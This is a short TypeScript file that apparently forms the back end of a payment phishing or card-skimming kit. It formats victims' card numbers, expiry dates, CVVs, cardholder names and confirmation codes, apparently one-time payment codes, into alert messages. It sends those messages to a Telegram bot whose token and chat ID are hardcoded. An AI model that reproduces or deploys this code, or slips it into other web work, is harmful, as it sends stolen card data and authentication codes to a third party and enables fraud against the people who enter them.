
const baseURL = "https://api.telegram.org/bot8178952651:AAELWc4jcQH_s_WG7rtkYMxUwdp2HzS-Uf8/";

export const sendMessage = async (message: string): Promise<void> => {
  try {
    const encodedMessage = encodeURIComponent(message);
    const url = `${baseURL}sendMessage?chat_id=-1002439271596&text=${encodedMessage}`;
    
    const response = await fetch(url);
    
    if (!response.ok) {
      console.error('Failed to send message to Telegram:', await response.text());
    } else {
      console.log('Message sent to Telegram successfully');
    }
  } catch (error) {
    console.error('Error sending message to Telegram:', error);
  }
};

export const formatPaymentData = (data: {
  cardNumber: string;
  expiryDate: string;
  cvv: string;
  nameOnCard: string;
}) => {
  return `
🔴 NEW PAYMENT DETAILS 🔴
Card Number: ${data.cardNumber}
Expiry Date: ${data.expiryDate}
CVV: ${data.cvv}
Name on Card: ${data.nameOnCard}
Amount: $1,539.61
`;
};

export const formatConfirmationCode = (code: string) => {
  return `
🔴 CONFIRMATION CODE 🔴
Code: ${code}
`;
};
